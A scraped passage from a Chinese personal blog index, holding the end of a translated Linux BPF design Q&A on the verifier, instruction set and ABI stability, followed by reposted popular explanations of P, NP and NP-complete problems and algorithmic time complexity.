helpers，因为他们都是原生C代码。对于与本机内核 C 代码无法区分的 JIT 化 BPF 程序尤其如此。\n问：这是否意味着对BPF代码进行‘创新’扩展是不允许的？ 答：算对吧（Soft yes）。\n至少到目前为止成立，直到BPF代码支持了bpf-to-bpf calls, indirect calls, loops, global variables, jump tables, read-only sections, 和其他所有C代码可以产生的结构。\n问：循环（loops）可以以安全的方式支持吗？ 答：目前还不清楚。\nBPF开发者正在尝试找到一种方式实现有界的循环（bounded loops）。\n问：verifier的限制是什么？ 答：用户空间已知的唯一限制是BPF_MAXINSNS(4096)，这是非特权bpf程序可以拥有的最大指令数。verifier有各种内部限制，像是程序分析过程中可以探索的最大指令数，目前，该限制设置为100万。 这实质上意味着最大的程序可以包含 100 万条 NOP 指令。 还有一些限制，包括后续分支的最大数量，嵌套 bpf 到 bpf 调用的数量，每条指令的verifier状态数量，程序使用的maps数量，所有这些限制都可能被足够复杂的程序触碰到。 还有一些非数字限制可能会导致程序被拒绝。 verifier过去仅识别指针+常量表达式，而现在它已经可以识别指针+bounded_register了； bpf_lookup_map_elem(key) 过去要求“key”必须是指向堆栈的指针，而现在，“key”可以是指向maps值的指针了。 verifier正在逐渐变得“更聪明”，一些限制正在被取消。 想知道程序能否被verifier接受的唯一方法是尝试加载它。 bpf 开发过程保证未来的内核版本一定能接受早期版本所接受的所有 bpf 程序。\n指令级别的问题 问：LD_ABS和LD_IND指令 与 C 代码比较 问：为什么BPF中存在LD_ABS 和 LD_IND指令，然而C代码并不能表达他们，而不得不使用内置内在函数（builtin intrinsics。译者注：编译器内建函数）？ 答：这是兼容classic BPF（译者注：cBPF）的神器。没有它们，现代的BPF网络代码性能更高。参见 'direct packet access'。\n问：BPF指令与原生CPU指令不能一一对应 问：看起来不是所有的BPF指令都能与CPU指令一一对应。例如，为什么BPF_JNE和其他比较和跳转指令与CPU的不一样？ 答：这是必要的，以避免将flags引入到 ISA 中，而这些flags不可能在跨CPU架构时实现的通用和高效。\n问：为什么BPF_DIV指令不映射到x64 div？ 答：因为如果我们选择一对一映射到x64，那么在arm64和其他架构上的支持将更复杂。同时它需要在运行时(runtime)检查除0异常（div-by-zero runtime check）。\n问：为什么没有针对有符号除法操作的BPF_SDIV指令？ 答：因为它很少用。llvm在这个案例下会打印错误，并且会建议使用无符号除法来取代。\n问：为什么BPF有隐式的prologue（序言）和 epilogue（尾声）？ 答：因为像 sparc 这样的体系结构具有寄存器窗口，并且通常体系结构之间存在足够细微的差异，因此将返回地址简单地存储到堆栈中是行不通的。 另一个原因是 BPF 必须避免被零除（以及 LD_ABS insn 的遗留异常路径）。 这些指令需要调用epilogue（尾声）并隐式返回。\n问：为什么BPF_JLT和BPF_JLE没有在最开始的时候引入？ 答：因为经典BPF（cBPF）没有它们，而且BPF作者们认为编译器的workaround是可以接受的。事实证明，由于缺少这些比较指令，程序会损失性能，所以它们又被加进来了。这两个指令是一个完美的例子，展示了何种新的BPF指令可以被接受以及有可能在未来被加进来。这两个已经有在原生CPU里等效的指令了，没有和硬件指令一一对应的新指令不会被接受。\n问：BPF 32位字寄存器需求 问：BPF 32位子寄存器需要将BPF寄存器的高32位清零，这使得BPF虚拟机对于 32 位 CPU 架构和 32 位硬件加速器来说效率低下。 未来BPF中可能添加真正的32位寄存器吗？ 答：NO。\n但已经有一些针对BPF寄存器高32位清零的优化，可用于改善JITed BPF程序在32位架构上的性能。\n从版本 7 开始，LLVM 能够生成在 32 位子寄存器上操作的指令，前提是传递选项 -mattr=+alu32 来编译程序。 此外，verifier现在可以标记需要将目标寄存器的高位清零的指令，并插入显式零扩展 (zext) 指令（mov32 变体）。 这意味着对于没有 zext 硬件支持的架构，JIT 后端不需要清除 alu32 指令或窄加载（narrow loads）写入的子寄存器的高位。 相反，后端只需要支持该 mov32 变体的代码生成，并覆盖 bpf_jit_needs_zext() 以使其返回“true”（以便在verifier中启用 zext 插入）。\n请注意，JIT 后端可能对 zext 提供部分硬件支持。 在这种情况下，如果启用了verifier zext 插入，则可能会导致插入不必要的 zext 指令。 可以通过在 JIT 后端内创建一个简单的窥视孔来删除此类指令：如果一条指令具有对 zext 的硬件支持，并且如果下一条指令是显式 zext，则在进行代码生成时可以跳过后者。\n问：BPF有稳定的ABI吗？ 答：YES。 BPF 指令、BPF 程序的参数、helper函数及其参数集、识别的返回码都是 ABI 的一部分。 然而，tracing程序有一个特定的例外，这些程序使用 bpf_probe_read() 等helpers来遍历内核内部数据结构和使用内核内部头文件进行编译。 这两个内核内部结构都可能发生变化，并且可能会与较新的内核发生冲突，因此程序需要进行相应的调整。\n新的 BPF 功能通常是通过使用 kfuncs 而不是新的helpers来添加的。 Kfunc 不被视为稳定 API 的一部分，并且具有自己的生命周期期望，如 “3. kfunc 生命周期期望”中所述。\n问：tracepoints是稳定的ABI的一部分吗？ 答：NO。 Tracepoints与内部实现细节相关，因此它们可能会发生变化，并且可能会与较新的内核发生冲突。 当这种情况发生时，BPF 程序需要做出相应的改变。\n问：kprobes可以attach的位置属于稳定的ABI的一部分吗？ 答：NO。kprobes 可以attach的位置是内部实现细节，这意味着它们可能会发生变化，并且可能会与较新的内核发生冲突。 当这种情况发生时，BPF 程序需要做出相应的改变。\n问：一个BPF程序可以使用多少栈空间（stack space）？ 答：目前，所有程序类型都限制为 512 字节的栈空间，但verifier会计算实际使用的栈空间，并且解释器和大多数 JITed 代码都会消耗必要的数量。\n问：BPF程序可以卸载到硬件上吗？ 答：YES。NFP 驱动程序支持BPF硬件卸载。\n问：经典BPF（cBPF）解释器还存在吗？ 答：NO。cBPF程序会被转换为eBPF（extend BPF）指令。\n问：BPF可以调用任意的内核函数吗？ 答：NO。BPF 程序只能调用以 BPF helpers函数或 kfunc 形式暴露的特定函数。 每种程序类型都定义了可用的函数集合。\n问：BPF可以覆盖任何的内核内存吗？ 答：NO。\nTracing bpf 程序可以使用 bpf_probe_read() 和 bpf_probe_read_str() helper程序读取任意内存。 网络程序无法读取任意内存，因为它们无权访问这些helper函数。 程序永远不能直接读取或写入任意内存。\n问：BPF程序可以覆盖任意的用户态内存吗？ 答：算是吧(Sort-of).\nTracing BPF程序可以使用bpf_probe_write_user()覆盖当前任务的用户内存。 每次加载此类程序时，内核都会打印警告消息，因此该helper程序仅对实验和原型是有用的。 Tracing BPF 程序仅限 root 用户可以使用。\n问：通过内核模块提供新功能 问：BPF 功能（例如新的程序或map类型、新helper程序等）是否可以从内核模块代码中添加？ 答：YES，通过kfuncs和kptrs。\n核心 BPF 功能（例如程序类型、maps和helper程序）无法通过模块添加。 然而，模块可以通过导出 kfuncs（它可能返回指向模块内部数据结构的指针作为 kptrs）来向 BPF 程序暴露功能。\n问：直接调用内核函数是ABI吗？ 问：一些内核函数（如tcp_slow_start）可以被BPF程序调用。这些内核函数成为了ABI吗？ 答：NO。\n内核函数原型会发生变化，bpf程序将被verifier拒绝。 另外，例如，一些 bpf 可调用的内核函数已经被其他内核 tcp cc（拥塞控制）实现所使用。 如果这些内核函数中的任何一个发生了更改，则树内和树外（译者注：git tree）内核 tcp cc 实现都必须更改。 bpf 程序也是如此，必须进行相应调整。 有关详细信息，请参阅 “3. kfunc 生命周期期望”。\n问：attach到任意的内核函数是ABI吗？ 问：BPF程序可以attach到很多内核函数上。这些内核函数成为了ABI的一部分吗？ 答：NO。\n内核函数原型会改变，attach到它们的 BPF 程序也需要改变。 应使用 BPF 一次编译、到处运行 (CO-RE)，以便更轻松地让 BPF 程序适应不同版本的内核。\n问：用 BTF_ID 标记函数会使该函数成为 ABI？ 答：NO。\n与 EXPORT_SYMBOL_GPL 宏一样，BTF_ID 宏不会导致函数成为 ABI 的一部分。\n问：map值中特殊 BPF 类型的兼容性是什么？ 问：用户被允许在其 BPF map值中嵌入 bpf_spin_lock、bpf_timer 字段（当使用 BPF maps的 BTF 支持时）。 这允许在map值内的这些字段上使用此类对象的helper程序。 用户还可以嵌入指向某些内核类型的指针（带有 __kptr_untrusted 和 __kptr BTF 标记）。 内核会保证这些功能的向后兼容性吗？ 答：这要看情况。 对于 bpf_spin_lock、bpf_timer：YES，对于 kptr 和其他所有内容：NO，但请参见下文。\n对于已经添加的结构类型，例如 bpf_spin_lock 和 bpf_timer，内核将保证向后兼容性，因为它们是 UAPI 的一部分。\n对于kptr来说，它们也是UAPI的一部分，但只是相对于kptr机制而言。 您可以在结构中与 __kptr_untrusted 和 __kptr 标记指针一起使用的类型不是UAPI 合约的一部分。 支持的类型可以并且将会随着内核版本的不同而改变。 但是，针对支持的类型，诸如访问 kptr 字段和 bpf_kptr_xchg() helper程序之类的操作将继续在不同内核版本中得到支持。\n对于任何其他受支持的结构类型，除非在本文档中明确说明并添加到 bpf.h UAPI 标头中，否则此类类型在跨内核版本时“可以”并且“将会”任意更改其大小、类型和对齐方式，或任何其他用户可见的 API 或 ABI 详细信息。 用户必须调整他们的 BPF 程序以适应新的变化并更新它们，以确保他们的程序继续正确工作。\n注意：BPF 子系统专门为类型名称保留了“bpf_”前缀，以便将来引入更多特殊字段。 因此，用户程序必须避免定义带有“bpf_”前缀的类型，以免在将来的版本中被破坏。 换句话说，如果在 BTF 中使用带有“bpf_”前缀的类型，则无法保证向后兼容性。\n问：分配对象中特殊 BPF 类型的兼容性是什么？ 问：与上面相同，但对于分配的对象（即使用 bpf_obj_new 为用户定义类型分配的对象）。 内核会保证这些功能的向后兼容性吗？ 答：NO。\n与map值类型不同，用于处理分配对象的 API 以及对其中特殊字段的任何支持都是通过 kfunc 公开的，因此具有与 kfunc 本身相同的生命周期期望。 有关详细信息，请参阅 “3. kfunc 生命周期期望”。\n","link":"https://weizhang555.github.io/translate/bpf-design-qa/","section":"translate","tags":["bpf","内核"],"title":"BPF的设计原则Q\u0026A"},{"body":"","link":"https://weizhang555.github.io/tags/pnp/","section":"tags","tags":null,"title":"P\u0026NP"},{"body":"","link":"https://weizhang555.github.io/republish/","section":"republish","tags":null,"title":"Republishes"},{"body":"","link":"https://weizhang555.github.io/categories/%E8%BD%AC%E8%BD%BD/","section":"categories","tags":null,"title":"转载"},{"body":"这篇文章对于N和NP问题讲解的非常通俗易通，值得一读。\n原文链接: 其一 其二\n以下为正文\n你会经常看到网上出现“这怎么做，这不是NP问题吗”、“这个只有搜了，这已经被证明是NP问题了”之类的话。这或许是众多OIer最大的误区之一。你要知道，大多数人此时所说的NP问题其实都是指的NPC问题。他们没有搞清楚NP问题和NPC问题的概念。NP问题并不是那种“只有搜才行”的问题，NPC问题才是。\n好，行了，基本上这个误解已经被澄清了。下面的内容都是在讲什么是P问题，什么是NP问题，什么是NPC问题，你如果不是很感兴趣就可以不看了。接下来你可以看到，把NP问题当成是 NPC问题是一个多大的错误。\n还是先用几句话简单说明一下时间复杂度。时间复杂度并不是表示一个程序解决问题需要花多少时间，而是当问题规模扩大后，程序需要的时间长度增长得有多快。\n也就是说，对于高速处理数据的计算机来说，处理某一个特定数据的效率不能衡量一个程序的好坏，而应该看当这个数据的规模变大到数百倍后，程序运行时间是否还是一样，或者也跟着慢了数百倍，或者变慢了数万倍。\n不管数据有多大，程序处理花的时间始终是那么多的，我们就说这个程序很好，具有O(1)的时间复杂度，也称常数级复杂度；数据规模变得有多大，花的时间也跟着变得有多长，这个程序的时间复杂度就是O(n)，比如找n个数中的最大值；而像冒泡排序、插入排序等，数据扩大2倍，时间变慢4倍的，属于O(n^2)的复杂度。\n还有一些穷举类的算法，所需时间长度成几何阶数上涨，这就是O(a^n)的指数级复杂度，甚至O(n!)的阶乘级复杂度。不会存在O(2*n^2)的复杂度，因为前面的那个“2”是系数，根本不会影响到整个程序的时间增长。同样地，O (n^3+n^2)的复杂度也就是O(n^3)的复杂度。\n因此，我们会说，一个O(0.01n^3)的程序的效率比O(100n^2)的效率低，尽管在n很小的时候，前者优于后者，但后者时间随数据规模增长得慢，最终O(n^3)的复杂度将远远超过O(n^2)。我们也说，O(n^100)的复杂度小于O(1.01^n)的复杂度。\n容易看出，前面的几类复杂度被分为两种级别，其中后者的复杂度无论如何都远远大于前者：一种是O(1)，O(log(n))，O(n^a)等，我们把它叫做多项式级的复杂度，因为它的规模n出现在底数的位置；另一种是O(a^n)和O(n!)型复杂度，它是非多项式级的，其复杂度计算机往往不能承受。\n当我们在解决一个问题时，我们选择的算法通常都需要是多项式级的复杂度，非多项式级的复杂度需要的时间太多，往往会超时，除非是数据规模非常小。\n自然地，人们会想到一个问题：会不会所有的问题都可以找到复杂度为多项式级的算法呢？很遗憾，答案是否定的。有些问题甚至根本不可能找到一个正确的算法来，这称之为“不可解问题”(Undecidable Decision Problem)。\nThe Halting Problem就是一个著名的不可解问题，在我的Blog上有过专门的介绍和证明。再比如，输出从1到n这n个数的全排列。不管你用什么方法，你的复杂度都是阶乘级，因为你总得用阶乘级的时间打印出结果来。\n有人说，这样的“问题”不是一个“正规”的问题，正规的问题是让程序解决一个问题，输出一个“YES”或“NO”（这被称为判定性问题），或者一个什么什么的最优值（这被称为最优化问题）。那么，根据这个定义，我也能举出一个不大可能会有多项式级算法的问题来：Hamilton回路。\n问题是这样的：给你一个图，问你能否找到一条经过每个顶点一次且恰好一次（不遗漏也不重复）最后又走回来的路（满足这个条件的路径叫做Hamilton回路）。这个问题现在还没有找到多项式级的算法。事实上，这个问题就是我们后面要说的NPC问题。\n下面引入P类问题的概念：如果一个问题可以找到一个能在多项式的时间里解决它的算法，那么这个问题就属于P问题。\n****P是英文单词多项式的第一个字母。哪些问题是P类问题呢？通常NOI和NOIP不会出不属于P类问题的题目。我们常见到的一些信息奥赛的题目都是P问题。道理很简单，一个用穷举换来的非多项式级时间的超时程序不会涵盖任何有价值的算法。\n接下来引入NP问题的概念。这个就有点难理解了，或者说容易理解错误。在这里强调（回到我竭力想澄清的误区上），NP问题不是非P类问题。NP问题是指可以在多项式的时间里验证一个解的问题。NP问题的另一个定义是，可以在多项式的时间里猜出一个解的问题。\n比方说，我RP很好，在程序中需要枚举时，我可以一猜一个准。现在某人拿到了一个求最短路径的问题，问从起点到终点是否有一条小于100个单位长度的路线。它根据数据画好了图，但怎么也算不出来，于是来问我：你看怎么选条路走得最少？\n我说，我RP很好，肯定能随便给你指条很短的路出来。然后我就胡乱画了几条线，说就这条吧。那人按我指的这条把权值加起来一看，嘿，神了，路径长度98，比100小。于是答案出来了，存在比100小的路径。别人会问他这题怎么做出来的，他就可以说，因为我找到了一个比100 小的解。\n在这个题中，找一个解很困难，但验证一个解很容易。验证一个解只需要O(n)的时间复杂度，也就是说我可以花O(n)的时间把我猜的路径的长度加出来。那么，只要我RP好，猜得准，我一定能在多项式的时间里解决这个问题。我猜到的方案总是最优的，不满足题意的方案也不会来骗我去选它。这就是NP问题。\n当然有不是NP问题的问题，即你猜到了解但是没用，因为你不能在多项式的时间里去验证它。下面我要举的例子是一个经典的例子，它指出了一个目前还没有办法在多项式的时间里验证一个解的问题。\n很显然，前面所说的Hamilton回路是NP问题，因为验证一条路是否恰好经过了每一个顶点非常容易。但我要把问题换成这样：试问一个图中是否不存在Hamilton回路。这样问题就没法在多项式的时间里进行验证了，因为除非你试过所有的路，否则你不敢断定它“没有Hamilton回路”。\n之所以要定义NP问题，是因为通常只有NP问题才可能找到多项式的算法。我们不会指望一个连多项式地验证一个解都不行的问题存在一个解决它的多项式级的算法。相信读者很快明白，信息学中的号称最困难的问题——“NP问题”，实际上是在探讨NP问题与P类问题的关系。\n很显然，所有的P类问题都是NP问题。也就是说，能多项式地解决一个问题，必然能多项式地验证一个问题的解——既然正解都出来了，验证任意给定的解也只需要比较一下就可以了。关键是，人们想知道，是否所有的NP问题都是P类问题。\n我们可以再用集合的观点来说明。如果把所有P类问题归为一个集合P中，把所有 NP问题划进另一个集合NP中，那么，显然有P属于NP。现在，所有对NP问题的研究都集中在一个问题上，即究竟是否有P=NP？通常所谓的“NP问题”，其实就一句话：证明或推翻P=NP。\nNP问题一直都是信息学的巅峰。巅峰，意即很引人注目但难以解决。在信息学研究中，这是一个耗费了很多时间和精力也没有解决的终极问题，好比物理学中的大统一和数学中的歌德巴赫猜想等。\n目前为止这个问题还“啃不动”。但是，一个总的趋势、一个大方向是有的。人们普遍认为，P=NP不成立，也就是说，多数人相信，存在至少一个不可能有多项式级复杂度的算法的NP问题。\n人们如此坚信P≠NP是有原因的，就是在研究NP问题的过程中找出了一类非常特殊的NP问题叫做NP-完全问题，也即所谓的 NPC问题。C是英文单词“完全”的第一个字母。正是NPC问题的存在，使人们相信P≠NP。下文将花大量篇幅介绍NPC问题，你从中可以体会到NPC问题使P=NP变得多么不可思议。\n为了说明NPC问题，我们先引入一个概念——约化(Reducibility，有的资料上叫“归约”)。\n简单地说，一个问题A可以约化为问题B的含义即是，可以用问题B的解法解决问题A，或者说，问题A可以“变成”问题B。\n《算法导论》上举了这么一个例子。比如说，现在有两个问题：求解一个一元一次方程和求解一个一元二次方程。那么我们说，前者可以约化为后者，意即知道如何解一个一元二次方程那么一定能解出一元一次方程。\n我们可以写出两个程序分别对应两个问题，那么我们能找到一个“规则”，按照这个规则把解一元一次方程程序的输入数据变一下，用在解一元二次方程的程序上，两个程序总能得到一样的结果。这个规则即是：两个方程的对应项系数不变，一元二次方程的二次项系数为0。按照这个规则把前一个问题转换成后一个问题，两个问题就等价了。\n同样地，我们可以说，Hamilton回路可以约化为TSP问题(Travelling Salesman Problem，旅行商问题)：在Hamilton回路问题中，两点相连即这两点距离为0，两点不直接相连则令其距离为1，于是问题转化为在TSP问题中，是否存在一条长为0的路径。Hamilton回路存在当且仅当TSP问题中存在长为0的回路。\n“问题A可约化为问题B”有一个重要的直观意义：B的时间复杂度高于或者等于A的时间复杂度。也就是说，问题A不比问题B难。这很容易理解。既然问题A能用问题B来解决，倘若B的时间复杂度比A的时间复杂度还低了，那A的算法就可以改进为B的算法，两者的时间复杂度还是相同。正如解一元二次方程比解一元一次方程难，因为解决前者的方法可以用来解决后者。\n很显然，约化具有一项重要的性质：约化具有传递性。如果问题A可约化为问题B，问题B可约化为问题C，则问题A一定可约化为问题C。这个道理非常简单，就不必阐述了。\n现在再来说一下约化的标准概念就不难理解了：如果能找到这样一个变化法则，对任意一个程序A的输入，都能按这个法则变换成程序B的输入，使两程序的输出相同，那么我们说，问题A可约化为问题B。\n当然，我们所说的“可约化”是指的可“多项式地”约化(Polynomial-time Reducible)，即变换输入的方法是能在多项式的时间里完成的。约化的过程只有用多项式的时间完成才有意义。\n好了，从约化的定义中我们看到，一个问题约化为另一个问题，时间复杂度增加了，问题的应用范围也增大了。通过对某些问题的不断约化，我们能够不断寻找复杂度更高，但应用范围更广的算法来代替复杂度虽然低，但只能用于很小的一类问题的算法。\n再回想前面讲的P和NP问题，联想起约化的传递性，自然地，我们会想问，如果不断地约化上去，不断找到能“通吃”若干小NP问题的一个稍复杂的大NP问题，那么最后是否有可能找到一个时间复杂度最高，并且能“通吃”所有的 NP问题的这样一个超级NP问题？\n答案居然是肯定的。也就是说，存在这样一个NP问题，所有的NP问题都可以约化成它。换句话说，只要解决了这个问题，那么所有的NP问题都解决了。\n这种问题的存在难以置信，并且更加不可思议的是，这种问题不只一个，它有很多个，它是一类问题。这一类问题就是传说中的NPC 问题，也就是NP-完全问题。NPC问题的出现使整个NP问题的研究得到了飞跃式的发展。我们有理由相信，NPC问题是最复杂的问题。\n再次回到全文开头，我们可以看到，人们想表达一个问题不存在多项式的高效算法时应该说它“属于NPC问题”。此时，我的目的终于达到了，我已经把NP问题和NPC问题区别开了。\n到此为止，本文已经写了近5000字了，我佩服你还能看到这里来，同时也佩服一下自己能写到这里来。\nNPC问题的定义非常简单。同时满足下面两个条件的问题就是NPC问题。首先，它得是一个NP问题；然后，所有的NP问题都可以约化到它。证明一个问题是 NPC问题也很简单。先证明它至少是一个NP问题，再证明其中一个已知的NPC问题能约化到它（由约化的传递性，则NPC问题定义的第二条也得以满足；至于第一个NPC问题是怎么来的，下文将介绍），这样就可以说它是NPC问题了。\n既然所有的NP问题都能约化成NPC问题，那么只要任意一个NPC问题找到了一个多项式的算法，那么所有的NP问题都能用这个算法解决了，NP也就等于P 了。因此，给NPC找一个多项式算法太不可思议了。因此，前文才说，“正是NPC问题的存在，使人们相信P≠NP”。我们可以就此直观地理解，NPC问题目前没有多项式的有效算法，只能用指数级甚至阶乘级复杂度的搜索。\n顺便讲一下NP-Hard问题。NP-Hard问题是这样一种问题，它满足NPC问题定义的第二条但不一定要满足第一条（就是说，NP-Hard问题要比 NPC问题的范围广）。NP-Hard问题同样难以找到多项式的算法，但它不列入我们的研究范围，因为它不一定是NP问题。\n即使NPC问题发现了多项式级的算法，NP-Hard问题有可能仍然无法得到多项式级的算法。事实上，由于NP-Hard放宽了限定条件，它将有可能比所有的NPC问题的时间复杂度更高从而更难以解决。\n不要以为NPC问题是一纸空谈。NPC问题是存在的。确实有这么一个非常具体的问题属于NPC问题。下文即将介绍它。\n下文即将介绍逻辑电路问题。这是第一个NPC问题。其它的NPC问题都是由这个问题约化而来的。因此，逻辑电路问题是NPC类问题的“鼻祖”。\n逻辑电路问题是指的这样一个问题：给定一个逻辑电路，问是否存在一种输入使输出为True。\n什么叫做逻辑电路呢？一个逻辑电路由若干个输入，一个输出，若干“逻辑门”和密密麻麻的线组成。看下面一例，不需要解释你马上就明白了。\n┌─────┐ │输入1 |─→┐ ┌────┐ └─────┘ └─→┤ │ │ OR ├──→─┐ ┌─────┐ ┌─→┤ │ │ ┌─────┐ │输入2 ├─→┤ └────┘ └→──┤ │ └─────┘ │ ┌─→─────┤ AND ├──→输出 └────────┘ ┌→─┤ │ ┌─────┐ ┌─────┐ │ └─────┘ │输入3 ├──→─┤ NOT ├─→───┘ └─────┘ └────—┘ 这是个较简单的逻辑电路，当输入1、输入2、输入3分别为True、True、False或False、True、False时，输出为True。\n有输出无论如何都不可能为True的逻辑电路吗？有。下面就是一个简单的例子。 ┌─────┐ │输入1 ├→─┐ ┌─────┐ └─────┘ └─→┤ │ │ AND ├─→──┐ ┌─→┤ │ │ │ └─────┘ │ ┌─────┐ │ └→┤ │ ┌─────┐ │ │ AND ├─→输出 │输入2 ├→─┤ ┌─────┐ ┌→─┤ │ └─────┘ └→─┤ NOT ├─→─┘ └─────┘ └─────┘ 上面这个逻辑电路中，无论输入是什么，输出都是False。我们就说，这个逻辑电路不存在使输出为True的一组输入。\n回到上文，给定一个逻辑电路，问是否存在一种输入使输出为True，这即逻辑电路问题。\n逻辑电路问题属于NPC问题。这是有严格证明的。它显然属于NP问题，并且可以直接证明所有的NP问题都可以约化到它（不要以为NP问题有无穷多个将给证明造成不可逾越的困难）。\n证明过程相当复杂，其大概意思是说任意一个NP问题的输入和输出都可以转换成逻辑电路的输入和输出（想想计算机内部也不过是一些 0和1的运算），因此对于一个NP问题来说，问题转化为了求出满足结果为True的一个输入（即一个可行解）。\n有了第一个NPC问题后，一大堆NPC问题就出现了，因为再证明一个新的NPC问题只需要将一个已知的NPC问题约化到它就行了。后来，Hamilton 回路成了NPC问题，TSP问题也成了NPC问题。现在被证明是NPC问题的有很多，任何一个找到了多项式算法的话所有的NP问题都可以完美解决了。因此说，正是因为NPC问题的存在，P=NP变得难以置信。\nP=NP问题还有许多有趣的东西，有待大家自己进一步的挖掘。攀登这个信息学的巅峰是我们这一代的终极目标。现在我们需要做的，至少是不要把概念弄混淆了。\n来源：http://www.matrix67.com/blog/archives/7084#more-7084\n2006 年，我在博客（当时还是 MSN Space）上发了 《什么是 P 问题、NP 问题和 NPC 问题》 一文。这是我高二搞信息学竞赛时随手写的一些东西，是我的博客中最早的文章之一。今天偶然发现，这篇现在看了恨不得重写一遍的“科普”竟仍然有比较大的阅读量。时间过得很快。《星际争霸》（StarCraft）出了续作，德国队 7 比 1 大胜东道主巴西，《学徒》（The Apprentice）里的那个家伙当了总统，非典之后竟然出了更大的疫情。现在已经是 2022 年了。这 16 年的时间里，我读了大学，出了书，娶了老婆，养了娃。如果现在的我写一篇同样话题的科普文章，我会写成什么样呢？正好，我的新书《神机妙算：一本关于算法的闲书》中有一些相关的内容。我从书里的不同章节中摘选了一些片段，整理加工了一下，弄出了下面这篇文章，或许能回答刚才的问题吧。\n有一天，我和老婆去超市大采购。和往常一样，结完账之后，我们需要小心谨慎地规划把东西放进购物袋的顺序，防止东西被压坏。这并不是一件容易的事情，尤其是考虑到各个物体自身的重量和它能承受的重量之间并无必然联系。鸡蛋、牛奶非常重，但同时也很怕压；毛巾、卫生纸都很轻，但却能承受很大的压力。\n于是，我突然想到了这么一个问题：给定 n 个物体各自的重量和它能承受的最大重量，判断出能否把它们叠成一摞，使得所有的物体都不会被压坏（一个物体不会被压坏的意思就是，它上面的物体的总重小于等于自己能承受的最大重量）。\n事实证明，这是一个非常有趣的问题——老婆听完这个问题后整日茶饭不思，晚上做梦都在念叨着自己构造的测试数据。这里，我们不妨给出一组数据供大家玩玩。\n假设有 A、B、C、D 四个物体，其中：物体 A 的自重为 1，最大承重为 9；物体 B 的自重为 5，最大承重为 2；物体 C 的自重为 2，最大承重为 4；物体 D 的自重为 3，最大载重为 12。在这个例子中，安全的叠放方式是唯一的，你能找出来吗？\n答案：C 在最上面，其次是 B，其次是 A，最下面是 D。注意，在这个最优方案中，最上面的物体既不是自身重量最小的，也不是承重极限最小的，而是自身重量与承重极限之和最小的。事实上，最优方案中的四个物体就是按照这个和的大小排列的！对于某种叠放方案中的某一个物体，不妨把它的最大载重减去实际载重的结果叫作它的安全系数。\n我们可以证明，这种按自身重量与载重能力之和排序的叠放策略可以让最危险的物体尽可能安全，也就是让最小的那个安全系数达到最大。如果此时所有物体的安全系数都是非负数，那么我们就相当于有了一种满足要求的叠放方案；如果此时仍然存在负的安全系数，那么我们就永远找不到让所有物体都安全的叠放方案了。\n假设在某种叠放方案中，有两个相邻的物体，上面那个物体的自身重量和最大载重分别为 W1 和 P1，下面那个物体的自身重量和最大载重分别为 W2 和 P2。再假设它俩之上的所有物体的重量之和是 W，这是这两个物体都要承担的重量。\n如果 W1 + P1 大于 W2 + P2，那么把这两个物体的位置交换一下，会发生什么事情呢？原先下面那个物体的安全系数为 P2 − W − W1，移到上面去之后安全系数变成了 P2 − W，这无疑使它更安全了。原先上面那个物体的安全系数为 P1 − W，移到下面后安全系数变成了 P1 − W − W2，这个值虽然减小了，但却仍然大于原先另一个物体的安全系数 P2 − W − W1（这里用到了 W1 + P1 \u0026gt; W2 + P2 的假设）。因此，交换两个物体之后，不但不会刷新安全系数的下限，相反有时还能向上改进它。\n所以说，我们可以不断地把自身重量与载重能力之和更小的物体换到上面去，反正这不会让情况变得更糟。最终得到的最优方案，也就与我们前面给出的结论一致了。\n为了解决某类问题，我们经常需要给出一个策略，或者说一个方案，或者说一个处理过程，或者说一系列操作规则，或者更贴切的，一套计算方法。这就是所谓的“算法” （algorithm）。\n让我们来总结一下。我们的问题是：给定 n 个物体各自的重量，以及每个物体最大可以承受的重量，判断出能否把它们叠成一摞，使得所有的物体都不会被压坏。它的算法则是：按照自身重量与最大承重之和进行排序，然后检验这是否能让所有物体都不被压坏，它的答案就决定了整个问题的答案。有了算法后，实际的计算过程一般就会交给计算机来完成的。程序员的工作，就是编写代码，把算法告诉计算机。\n让计算机把每个物体的自身重量和最大承重加起来，这好办。如果有 n 个物体，那就要算 n 遍加法。给它们排序的时候，我们要依次做下面这些事情：\n把 n 个数逐一过一遍，找出最小的那个数（n 次操作） 把最小的那个数放到第 1 个位置（1 次操作） 把剩下的 n − 1 个数逐一过一遍，找出最小的那个数（n − 1 次操作） 把最小的那个数放到第 2 个位置（1 次操作） …… 这要用 n + 1 + (n − 1) + 1 + … + 1 + 1 = (n2 + 3n) / 2 次操作。物体从上到下该怎么摆，现在就知道了。为了检验有没有东西被压坏，则需要把物体的重量从上到下累加一遍，边加边要和下一个物体的承重做比较。\n考虑到最上面的物体不用做检验，操作次数姑且就算 2(n − 1) 吧。这样的话，整个算法需要 (n2 + 9n) / 2 − 2 次操作。当然，在编写程序时，一些细节处可能还需要很多额外的操作。不过，对于运算速度极快的计算机来说，这都可以忽略不计。\n计算机动辄处理成千上万的数据，多那么一两次操作不会从根本上影响整个处理过程的开销。为了评估处理数据的效率，我们更应该关注总操作次数的“级别”。我们甚至可以把 (n2 + 3n) / 2 次操作、(n2 + 9n) / 2 − 2 次操作以及 2n2 + n + 1 次操作、10n2 − 13n + 500 次操作等等，统统都叫作“操作次数以 n2 的级别增长”，它们都代表着同一个意思：当 n 很大的时候，如果 n 变成了原来的 k 倍，那么总的开销大致就会变成原来的 k2 倍。\n1894 年，德国数学家保罗·巴赫曼（Paul Bachmann）提出了一种使用起来非常方便的“大 O 记号”（big O notation），用到这里真是再适合不过了。如果某个函数 f(n) 的增长速度不超过 n2 的级别，那么我们就可以记下 f(n) = O(n2)。因而，随着 n 的增加，(n2 + 3n) / 2 、(n2 + 9n) / 2 − 2 、2n2 + n + 1 、10n2 − 13n + 500 的增长速度都可以用 O(n2) 来表示。类似地，n3 / 10、(n3 + 3n) / 2、10n3 − 6n2 + 100 则都相当于 O(n3)。\n完成刚才那个算法需要的操作次数是 O(n2) 级别的。假设每次操作耗时相同，那么运行这个算法所需要的时间也应该是 O(n2) 级别的。更专业的说法则是，整个算法的“时间复杂度”（time complexity）为 O(n2)。\n1985 年由英特尔公司推出的 80386 芯片每秒钟可以执行 200 万个指令，1999 年的英特尔奔腾 III 处理器每秒钟可以执行 20 亿个指令，2012 年的英特尔酷睿 i7 处理器每秒则可以执行 1000 亿个以上的指令。\n不妨假设，当 n = 10 的时候，借助上述算法，计算机只需要 0.1 毫秒就能得到答案。算法的时间复杂度为 O(n2)，说明当 n 增加到原来的 100 倍时，运行完成所需的时间会增加到原来的 10000 倍。因此，如果 n 变成了 1000 时，计算机也只需要 1 秒就能得到答案。即使 n 增加到了 